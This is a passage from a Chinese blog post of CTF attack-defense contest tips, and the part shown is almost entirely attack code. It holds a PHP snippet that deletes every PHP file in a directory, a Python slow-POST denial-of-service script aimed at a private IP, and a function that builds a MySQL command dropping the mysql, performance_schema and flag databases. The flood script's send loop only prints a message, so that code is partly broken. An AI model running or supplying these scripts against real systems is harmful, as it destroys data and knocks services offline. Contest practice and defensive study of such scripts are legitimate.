+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;unlink&#x27;</span>, <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;some/dir/*.php&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x04-DDOS脚本-最好不要用"><a href="#0x04-DDOS脚本-最好不要用" class="headerlink" title="0x04.DDOS脚本(最好不要用)"></a>0x04.DDOS脚本(最好不要用)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-built_in">max</span>=<span class="hljs-number">90000000</span><br>port=<span class="hljs-number">80</span>                 <span class="hljs-comment">#端口</span><br>host=<span class="hljs-string">&quot;192.168.92.154&quot;</span>   <span class="hljs-comment">#IP</span><br>page=<span class="hljs-string">&quot;/index.php&quot;</span><br><br>bag=(<span class="hljs-string">&quot;POST %s HTTP/1.1\r\n&quot;</span><br>    <span class="hljs-string">&quot;host: %s\r\n&quot;</span><br>    <span class="hljs-string">&quot;Content-Length: 1000000000\r\n&quot;</span><br>    <span class="hljs-string">&quot;Cookie: 1998\r\n&quot;</span><br>    <span class="hljs-string">&quot;\r\n&quot;</span> % (page,host))<br><br>socks = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> socks<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>):<br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        <span class="hljs-keyword">try</span>:<br>            s.connect((host,port))<br>            s.send(bag.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>            socks.append(s)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>            time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>():<br>    <span class="hljs-keyword">global</span> socks<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> socks:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;攻击中....&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>                socks.remove(s)<br>                s.close()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br><br>One = threading.Thread(target=connect,args=())<br>Two = threading.Thread(target=send,args=())<br>One.start()<br>Two.start()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x05-删除数据库"><a href="#0x05-删除数据库" class="headerlink" title="0x05.删除数据库"></a>0x05.删除数据库</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python3</span><br>  import <span class="hljs-built_in">base64</span><br>  def rm_db(db_user,my_db_passwd):<br>      cmd = <span class="hljs-string">&quot;/usr/bin/mysql -h localhost -u%s %s -e &#x27;&quot;</span>%(db_user,my_db_passwd)<br>      db_name = [<span class="hljs-string">&#x27;performance_schema&#x27;</span>,<span class="hljs-string">&#x27;mysql&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>]<br>      <span class="hljs-keyword">for</span> db <span class="hljs-keyword">in</span> db_name:<br>          cmd += <span class="hljs-string">&quot;drop database %s;&quot;</span>%db<br>      cmd += <span class="hljs-string">&quot;&#x27;&quot;</span><br>      <span class="hljs-built_in">return</span> cmd<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://s2.loli.net/2023/07/28/3vV7jfCBModAYlw.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://leekosss.github.io/2023/08/24/CTF线下赛AWD知识点/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年8月1日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/FCTF2023/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/ctfshow%5B%E6%84%9A%E4%BA%BA%E6%9D%AF%5D/" title="ctfshow【愚人杯】">
+                        <span class="hidden-mobile">ctfshow【愚人杯】</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
